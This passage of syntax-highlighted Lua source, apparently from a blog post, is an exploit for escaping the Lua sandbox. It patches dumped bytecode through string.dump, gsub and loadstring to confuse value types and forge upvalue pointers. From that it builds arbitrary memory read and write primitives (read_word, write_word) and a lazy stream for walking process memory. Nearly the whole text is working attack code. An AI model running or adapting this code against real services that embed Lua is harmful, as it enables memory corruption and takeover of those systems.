</span><span class='line'><span class="kd">local</span> <span class="n">double2string</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">&lt;d&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">asdouble</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">((</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="mi">0</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">i</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span><span class="p">):</span><span class="n">gsub</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\96</span><span class="s">%z%z</span><span class="se">\128</span><span class="s">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\22\0\0\128</span><span class="s">&#39;</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">asstring</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">return</span> <span class="n">double2string</span><span class="p">(</span><span class="n">asdouble</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">cstring</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addbyte</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">24</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">string2double</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">r</span><span class="p">,</span><span class="n">n</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">&lt;d&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">r</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">subb8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">b8r</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">borrow</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">cb</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="n">borrow</span> <span class="o">-</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8r</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">cb</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">borrow</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">cb</span> <span class="o">=</span> <span class="n">cb</span> <span class="o">+</span> <span class="mi">256</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">borrow</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">cb</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">tob8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">256</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">next_byte</span><span class="p">)</span>
</span><span class='line'>    <span class="n">n</span> <span class="o">=</span> <span class="nb">math.floor</span><span class="p">(</span><span class="n">n</span> <span class="o">/</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">toint</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">*</span> <span class="mi">256</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addb8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">b8r</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">&#39;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">cb</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">carry</span> <span class="o">+</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8r</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">cb</span> <span class="o">&gt;=</span> <span class="mi">256</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">cb</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addint</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">int</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addb8</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">tob8</span><span class="p">(</span><span class="n">int</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">subint</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">int</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">subb8</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">tob8</span><span class="p">(</span><span class="n">int</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dump8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">b8</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="s2">&quot;</span><span class="s">&lt;nil&gt;&quot;</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">string.format</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">%02x%02x%02x%02x%02x%02x%02x%02x&#39;</span><span class="p">,</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">6</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dump4</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b4</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.format</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">%02x%02x%02x%02x&#39;</span><span class="p">,</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">word_read</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">return_read_word</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="n">word_read</span> <span class="o">=</span> <span class="n">b8</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">read_word</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">(</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">()</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">magic</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>    <span class="kd">local</span> <span class="k">function</span> <span class="nf">middle</span><span class="p">()</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">upval</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">cstring</span> <span class="o">=</span> <span class="n">cstring_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">asstring</span> <span class="o">=</span> <span class="n">asstring_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">b8</span> <span class="o">=</span> <span class="n">word_to_read_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">return_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="k">function</span> <span class="nf">inner</span><span class="p">()</span>
</span><span class='line'>        <span class="n">upval</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">nextnext&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">t&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">m&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">papapa&#39;</span><span class="o">..</span><span class="n">b8</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">upval_ptr</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">(</span><span class="n">upval</span><span class="p">)</span>
</span><span class='line'>        <span class="n">magic</span> <span class="o">=</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">inner</span><span class="p">()</span>
</span><span class='line'>      <span class="n">ret</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">magic</span><span class="p">))</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">middle</span><span class="p">()</span>
</span><span class='line'>  <span class="k">end</span><span class="p">):</span><span class="n">gsub</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">(</span><span class="se">\100</span><span class="s">%z%z%z)....&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">%1</span><span class="se">\0\0\0\1</span><span class="s">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">return_function</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="n">cstring_global</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">,</span> <span class="n">asstring_global</span> <span class="o">=</span> <span class="n">asstring</span><span class="p">,</span> <span class="n">word_to_read_global</span> <span class="o">=</span> <span class="n">address</span><span class="p">,</span> <span class="n">return_read_word_global</span> <span class="o">=</span> <span class="n">return_read_word</span><span class="p">,</span> <span class="n">return_global</span> <span class="o">=</span> <span class="n">return_function</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">setfenv</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
</span><span class='line'>  <span class="n">f</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="cm">--[[ write word also corrupts the next 4 bytes after address :( const TValue *o2=(obj2); TValue *o1=(obj1); \</span>
</span><span class='line'><span class="cm">    o1-&gt;value = o2-&gt;value; o1-&gt;tt=o2-&gt;tt; ]]</span>
</span><span class='line'><span class="kd">local</span> <span class="n">write_word</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">(</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">()</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">magic</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>    <span class="kd">local</span> <span class="k">function</span> <span class="nf">middle</span><span class="p">()</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">upval</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">cstring</span> <span class="o">=</span> <span class="n">cstring_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">string2double</span> <span class="o">=</span> <span class="n">string2double_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">b8</span> <span class="o">=</span> <span class="n">address_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">value</span> <span class="o">=</span> <span class="n">value_to_write_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="k">function</span> <span class="nf">inner</span><span class="p">()</span>
</span><span class='line'>        <span class="n">upval</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">nextnext&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">t&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">m&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">papapa&#39;</span><span class="o">..</span><span class="n">b8</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">upval_ptr</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">(</span><span class="n">upval</span><span class="p">)</span>
</span><span class='line'>        <span class="n">magic</span> <span class="o">=</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">inner</span><span class="p">()</span>
</span><span class='line'>      <span class="n">magic</span> <span class="o">=</span> <span class="n">string2double</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">middle</span><span class="p">()</span>
</span><span class='line'>  <span class="k">end</span><span class="p">):</span><span class="n">gsub</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">(</span><span class="se">\100</span><span class="s">%z%z%z)....&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">%1</span><span class="se">\0\0\0\1</span><span class="s">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="n">cstring_global</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">,</span> <span class="n">string2double_global</span> <span class="o">=</span> <span class="n">string2double</span><span class="p">,</span> <span class="n">address_global</span> <span class="o">=</span> <span class="n">address</span><span class="p">,</span> <span class="n">value_to_write_global</span> <span class="o">=</span> <span class="n">value</span><span class="p">}</span>
</span><span class='line'>  <span class="nb">setfenv</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
</span><span class='line'>  <span class="n">f</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">new_lazy_stream</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">buffer</span> <span class="o">=</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">buffer_offset</span> <span class="o">=</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">start_offset</span> <span class="o">=</span> <span class="n">offset</span><span class="p">,</span> <span class="n">current_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_seek</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">=</span> <span class="n">offset</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_skip</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">+</span> <span class="n">offset</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_read</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer</span> <span class="o">==</span> <span class="kc">nil</span> <span class="ow">or</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">&lt;</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="ow">or</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">&gt;=</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="o">+</span> <span class="mi">8</span> <span class="k">then</span>
</span><span class='line'>    <span class="cm">--[[ dodgy floats ie repeated bytes of 0xFF will trigger multiple reads because the first word will fail then the next and so forth :( )]]</span>
</span><span class='line'>    <span class="n">stream</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">start_offset</span><span class="p">,</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span><span class="p">))</span>
</span><span class='line'>    <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">byte</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">byte</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">-</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">byte</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_empty</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">&gt;=</span> <span class="n">stream</span><span class="p">.</span><span class="n">size</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">read_uleb8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">shift</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">masked</span> <span class="o">=</span> <span class="n">next_byte</span> <span class="o">%</span> <span class="mh">0x80</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="n">value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">+</span> <span class="p">(</span><span class="n">masked</span> <span class="o">*</span> <span class="n">shift</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">high_bit</span> <span class="o">=</span> <span class="n">next_byte</span> <span class="o">-</span> <span class="n">masked</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">high_bit</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">value</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">shift</span> <span class="o">=</span> <span class="n">shift</span> <span class="o">*</span> <span class="nb">math.pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">read_string</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">value</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">next_byte</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="nb">table.concat</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">next_byte</span><span class="p">))</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">ALTERNATION</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'><span class="kd">local</span> <span class="n">FINAL</span> <span class="o">=</span> <span class="mi">257</span>
</span><span class='line'><span class="kd">local</span> <span class="n">ANY</span> <span class="o">=</span> <span class="mi">258</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">alternation</span><span class="p">(</span><span class="n">list</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">list</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">assertion failed&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">list</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">list</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>
